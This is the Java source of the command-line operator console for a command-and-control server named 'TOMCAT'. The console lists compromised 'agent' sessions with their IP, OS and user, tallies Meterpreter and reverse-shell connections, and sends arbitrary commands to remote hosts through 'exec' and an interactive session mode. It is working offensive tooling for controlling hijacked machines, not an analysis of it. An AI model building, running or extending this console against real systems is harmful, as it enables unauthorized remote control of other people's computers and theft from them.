package com.tomcat.iface;

import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.server.ListenerMode;
import com.tomcat.core.server.TomcatServer;
import com.tomcat.core.session.Session;
import com.tomcat.iface.banner.AUTHBanner;
import com.tomcat.iface.banner.CLIBanner;
import com.tomcat.iface.banner.EndBanner;
import com.tomcat.iface.banner.TBanner;
import com.tomcat.utils.AnsiColor;
import com.tomcat.utils.ServerConfig;
import com.tomcat.utils.SystemHelper;
import java.io.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;

public class CLI {

    private final ServerConfig Config;
    private TomcatServer Server;
    private Instant ServerStartTime;
    private final List<String> Logs = new CopyOnWriteArrayList<>();
    private final int MaxLogs;
    private volatile boolean Running = true;
    private int CurrentSession = -1;
    private ListenerMode ActiveMode = ListenerMode.MULTI;

    public CLI(ServerConfig Config) {
        this.Config = Config;
        this.MaxLogs = Config.GetMaxLogEntries();
    }

    private String RenderBox(String Title) {
        int Width = 72;
        int Pad = (Width - Title.length()) / 2;
        if (Pad < 0) Pad = 0;
        String Top = "  " + AnsiColor.Red + "┌" + "─".repeat(Width) + "┐" + AnsiColor.Reset;
        String Mid =
            "  " +
            AnsiColor.Red +
            "│" +
            " ".repeat(Pad) +
            AnsiColor.White +
            Title +
            " ".repeat(Width - Pad - Title.length()) +
            AnsiColor.Red +
            "│" +
            AnsiColor.Reset;
        String Bot = "  " + AnsiColor.Red + "└" + "─".repeat(Width) + "┘" + AnsiColor.Reset;
        return "\n" + Top + "\n" + Mid + "\n" + Bot;
    }

    private String RenderOutputBox(String Output) {
        int Width = 68;
        String Label = "─ Output ";
        String Top = "  " + AnsiColor.Green + "┌" + Label + "─".repeat(Width - Label.length()) + "┐" + AnsiColor.Reset;
        String Bot = "  " + AnsiColor.Green + "└" + "─".repeat(Width) + "┘" + AnsiColor.Reset;
        StringBuilder Lines = new StringBuilder();
        Lines.append(Top).append("\n");
        for (String Line : Output.split("\n")) {
            while (Line.length() > Width) {
                String Chunk = Line.substring(0, Width);
                Lines.append("  ")
                    .append(AnsiColor.Green)
                    .append("│ ")
                    .append(AnsiColor.White)
                    .append(Chunk)
                    .append(AnsiColor.Green)
                    .append(" │")
                    .append(AnsiColor.Reset)
                    .append("\n");
                Line = Line.substring(Width);
            }
            int Pad = Math.max(0, Width - Line.length());
            Lines.append("  ")
                .append(AnsiColor.Green)
                .append("│ ")
                .append(AnsiColor.White)
                .append(Line)
                .append(" ".repeat(Pad))
                .append(" ")
                .append(AnsiColor.Green)
                .append("│")
                .append(AnsiColor.Reset)
                .append("\n");
        }
        Lines.append(Bot);
        return Lines.toString();
    }

    private String RenderDivider() {
        return "  " + AnsiColor.Red + "─".repeat(72) + AnsiColor.Reset;
    }

    private void ShowHelp() {
        SystemHelper.ClearScreen();
        TBanner.Logo();
        AUTHBanner.Logo();
        System.out.println(RenderBox("COMMAND REFERENCE"));
        System.out.println();
        CLIBanner.Logo();
    }

    private void ShowSessions() {
        if (Server == null) {
            System.out.println("  ✘ Server not running");
            return;
        }
        List<Session> Sessions = Server.GetSessions().GetAll();
        System.out.println(RenderBox("ACTIVE SESSIONS"));
        System.out.println();
        if (Sessions.isEmpty()) {
            System.out.println("  ⚠ No active sessions");
            return;
        }
        System.out.printf(
            "  %s%-5s %-14s %-14s %-16s %-10s %-10s%s%n",
            AnsiColor.Red,
            "ID",
            "TYPE",
            "AGENT",
            "IP",
            "OS",
            "USER",
            AnsiColor.Reset
        );
        System.out.println(RenderDivider());
        for (Session S : Sessions) {
            System.out.printf(
                "  %s#%-4d %-14s %-14s %-16s %-10s %-10s%s%n",
                AnsiColor.White,
                S.GetId(),
                S.GetSessionType().name(),
                S.GetAgentName(),
                S.GetAgentIp(),
                S.GetOs(),
                S.GetUser(),
                AnsiColor.Reset
            );
        }
        System.out.println();
    }

    private void ShowStatus() {
        if (Server == null || !Server.IsRunning()) {
            System.out.println("  ✘ Server not running");
            return;
        }
        long Elapsed = ServerStartTime != null ? Duration.between(ServerStartTime, Instant.now()).getSeconds() : 0;
        System.out.println(RenderBox("SERVER STATUS"));
        System.out.println();
        System.out.printf("  %sStatus    %s● ONLINE%n", AnsiColor.Red, AnsiColor.Green);
        System.out.printf("  %sUptime    %s%s%n", AnsiColor.Red, AnsiColor.White, SystemHelper.FormatUptime(Elapsed));
        System.out.printf("  %sSessions  %s%d%n", AnsiColor.Red, AnsiColor.White, Server.GetSessions().Count());
        System.out.printf("  %sMTLS      %s%s%n", AnsiColor.Red, AnsiColor.White, ActiveMode.name());
        System.out.println();
    }

    private void ShowStats() {
        if (Server == null) {
            System.out.println("  ✘ Server not running");
            return;
        }
        Map<String, Integer> Stats = Server.GetSessions().GetStats();
        System.out.println(RenderBox("SESSION STATISTICS"));
        System.out.println();
        System.out.printf(
            "  %sServer Key     %s%s%n",
            AnsiColor.Red,
            AnsiColor.White,
            Server.GetCrypto().GetKeyAsBase64Url()
        );
        System.out.printf(
            "  %sServer Address %s%s:%d%n",
            AnsiColor.Red,
            AnsiColor.White,
            Server.GetHost(),
            Server.GetPort()
        );
        System.out.printf("  %sTotal          %s%d%n", AnsiColor.Red, AnsiColor.White, Stats.get("Total"));
        System.out.printf("  %sTOMCAT         %s%d%n", AnsiColor.Red, AnsiColor.White, Stats.get("TOMCAT"));
        System.out.printf("  %sMeterpreter    %s%d%n", AnsiColor.Red, AnsiColor.White, Stats.get("METERPRETER"));
        System.out.printf("  %sReverse Shell  %s%d%n", AnsiColor.Red, AnsiColor.White, Stats.get("REVERSE_SHELL"));
        System.out.println();
    }

    private void ShowLogs() {
        System.out.println(RenderBox("RECENT LOGS"));
        System.out.println();
        if (Logs.isEmpty()) {
            System.out.println("  ⚠ No logs available");
            System.out.println();
            return;
        }
        int Start = Math.max(0, Logs.size() - 20);
        for (int I = Start; I < Logs.size(); I++) System.out.println(Logs.get(I));
        System.out.println();
    }

    private void ExecuteCommand(int SessionId, String Command) {
        if (Server == null) {
            System.out.println("  ✘ Server not running");
            return;
        }
        String[] Result = Server.ExecuteCommand(SessionId, Command);
        boolean Ok = Boolean.parseBoolean(Result[0]);
        if (Ok) {
            System.out.println(RenderOutputBox(Result[1]));
            AddLog(AnsiColor.Green + "◀ SESSION-" + SessionId + " OK" + AnsiColor.Reset, false);
        } else {
            System.out.println("  ✘ Error: " + Result[1]);
            AddLog(AnsiColor.Red + "✘ SESSION-" + SessionId + " FAIL: " + Result[1] + AnsiColor.Reset, false);
        }
    }

    private void InteractiveSession(int SessionId) {
        Optional<Session> Opt = Server.GetSessions().Get(SessionId);
        if (Opt.isEmpty()) {
            System.out.println("  ✘ Session not found");
            return;
        }
        Session S = Opt.get();
        SystemHelper.ClearScreen();
        TBanner.Logo();
        System.out.println(RenderBox("INTERACTIVE SESSION"));
        System.out.printf(
            "%n  %sSESSION-%d%s  [%s]%n",
            AnsiColor.Red,
            SessionId,
            AnsiColor.Reset,
            S.GetSessionType().name()
        );
        System.out.printf("  Agent: %s (%s)%n", S.GetAgentName(), S.GetOs());
        System.out.printf("  IP: %s%n%n", S.GetAgentIp());
        System.out.printf("  → Type 'back' to return%n");
        AddLog(AnsiColor.Red + "↳ Entered SESSION-" + SessionId + AnsiColor.Reset, false);
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        CurrentSession = SessionId;
        while (CurrentSession == SessionId) {
            try {
                System.out.printf(
                    "%n%s(%sSESSION-%d%s)%s ≫ %s",
                    AnsiColor.Red,
                    AnsiColor.White,
                    SessionId,
                    AnsiColor.Red,
                    AnsiColor.White,
                    AnsiColor.Reset
                );
                String Cmd = Reader.readLine();
                if (Cmd == null || Cmd.trim().isEmpty()) continue;
                Cmd = Cmd.trim();
                if (Cmd.equalsIgnoreCase("back")) {
                    CurrentSession = -1;
                    System.out.printf("  %s◀ Returned to main console%s%n", AnsiColor.Red, AnsiColor.Reset);
                    break;
                }
                if (Cmd.equalsIgnoreCase("clear")) {
                    SystemHelper.ClearScreen();
                    TBanner.Logo();
                    continue;
                }
                AddLog(AnsiColor.Red + "▶ SESSION-" + SessionId + ": " + Cmd + AnsiColor.Reset, false);
                ExecuteCommand(SessionId, Cmd);
            } catch (IOException E) {
                break;
            }
        }
    }

    private void KillSession(int SessionId) {
        Optional<Session> Opt = Server.GetSessions().Get(SessionId);
        if (Opt.isEmpty()) {
            System.out.println("  ✘ Session not found");
            return;
        }
        String Name = Opt.get().GetAgentName();
        Server.RemoveSession(SessionId);
        System.out.printf("  ✔ SESSION-%d (%s) terminated%n", SessionId, Name);
        AddLog(AnsiColor.Green + "✔ SESSION-" + SessionId + " (" + Name + ") killed" + AnsiColor.Reset, false);
    }

    private void ServerEventHandler(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case ServerStarted -> AddLog(
                AnsiColor.White +
                "✔ Server listening on " +
                Data.get("Host") +
                ":" +
                Data.get("Port") +
                AnsiColor.Reset,
                true
            );
            case AgentConnected -> AddLog(
                AnsiColor.Green +
                "★ [" +
                Data.get("Type") +
                "] SESSION-" +
                Data.get("ID") +
                ": " +
                Data.get("AgentName") +
                " (" +
                Data.get("OS") +
                ")" +
                AnsiColor.Reset,
                true
            );
            case AgentDisconnected -> AddLog(
                AnsiColor.Red +
                "✖ SESSION-" +
                Data.get("ID") +
                " disconnected: " +
                Data.get("Reason") +
                AnsiColor.Reset,
                true
            );
            case AgentRemoved -> AddLog(
                AnsiColor.White + "⊘ SESSION-" + Data.get("ID") + " removed" + AnsiColor.Reset,
                false
            );
            case Error -> AddLog(AnsiColor.Red + "✘ Error: " + Data.get("Message") + AnsiColor.Reset, true);
        }
    }

    private boolean StartServer(String Host, int Port, ListenerMode Mode) {
        Server = new TomcatServer(Host, Port, Mode, Config);
        Server.AddEventListener(this::ServerEventHandler);
        boolean[] Result = Server.StartServer();
        if (!Result[0]) {
            AddLog(AnsiColor.Red + "✘ Failed to start server" + AnsiColor.Reset, true);
            return false;
        }
        ServerStartTime = Instant.now();
        Thread T = new Thread(Server::AcceptConnections, "AcceptConnections");
        T.setDaemon(true);
        T.start();
        return true;
    }

    private void AddLog(String Msg, boolean PrintNow) {
        String Ts = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
        String Entry = "  " + AnsiColor.Red + "[" + Ts + "]" + AnsiColor.Reset + " " + Msg;
        Logs.add(Entry);
        if (Logs.size() > MaxLogs) Logs.remove(0);
        if (PrintNow) System.out.println(Entry);
    }

    private void RunLoop() {
        ShowHelp();
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        int LastLogCount = Logs.size();
        while (Running) {
            try {
                int Current = Logs.size();
                if (Current > LastLogCount) {
                    System.out.printf(
                        "  %s● %d new events — type 'logs' to view%s%n",
                        AnsiColor.White,
                        Current - LastLogCount,
                        AnsiColor.Reset
                    );
                    LastLogCount = Current;
                }
                System.out.printf(
                    "%n%s┌──(%sTOMCAT@C2%s)%n%s└─%s≫ %s",
                    AnsiColor.Red,
                    AnsiColor.White,
                    AnsiColor.Red,
                    AnsiColor.Red,
                    AnsiColor.White,
                    AnsiColor.Reset
                );
                String Input = Reader.readLine();
                if (Input == null || Input.trim().isEmpty()) continue;
                String[] Parts = Input.trim().split("\\s+", 3);
                String Cmd = Parts[0].toLowerCase();
                switch (Cmd) {
                    case "exit" -> {
                        System.out.printf("  %s⏻ Shutting Down Server%s%n", AnsiColor.White, AnsiColor.Reset);
                        if (Server != null) Server.StopServer();
                        Running = false;
                    }
                    case "help" -> ShowHelp();
                    case "clear" -> {
                        SystemHelper.ClearScreen();
                        TBanner.Logo();
                        LastLogCount = Logs.size();
                    }
                    case "sessions" -> ShowSessions();
                    case "status" -> ShowStatus();
                    case "stats" -> ShowStats();
                    case "logs" -> {
                        ShowLogs();
                        LastLogCount = Logs.size();
                    }
                    case "use" -> {
                        if (Parts.length < 2) {
                            System.out.println("  ⚠ Usage: use <session id>");
                            continue;
                        }
                        try {
                            int Id = Integer.parseInt(Parts[1]);
                            InteractiveSession(Id);
                            LastLogCount = Logs.size();
                        } catch (NumberFormatException E) {
                            System.out.println("  ✘ Invalid session ID");
                        }
                    }
                    case "exec" -> {
                        if (Parts.length < 3) {
                            System.out.println("  ⚠ Usage: exec <session id> <command>");
                            continue;
                        }
                        try {
                            int Id = Integer.parseInt(Parts[1]);
                            ExecuteCommand(Id, Parts[2]);
                        } catch (NumberFormatException E) {
                            System.out.println("  ✘ Invalid session ID");
                        }
                    }
                    case "kill" -> {
                        if (Parts.length < 2) {
                            System.out.println("  ⚠ Usage: kill <session id>");
                            continue;
                        }
                        try {
                            int Id = Integer.parseInt(Parts[1]);
                            KillSession(Id);
                        } catch (NumberFormatException E) {
                            System.out.println("  ✘ Invalid session ID");
                        }
                    }
                    default -> {
                        System.out.printf("  %s✘ Unknown Command: %s%s%n", AnsiColor.Red, Cmd, AnsiColor.Reset);
                        System.out.println("  → Type 'help' for available commands");
                    }
                }
            } catch (IOException E) {
                break;
            }
        }
        EndBanner.EndLogo();
    }

    public void Run(String Host, int Port, ListenerMode Mode) {
        this.ActiveMode = Mode;
        if (!StartServer(Host, Port, Mode)) return;
        try {
            Thread.sleep(500);
        } catch (InterruptedException Ignored) {}
        RunLoop();
    }
}
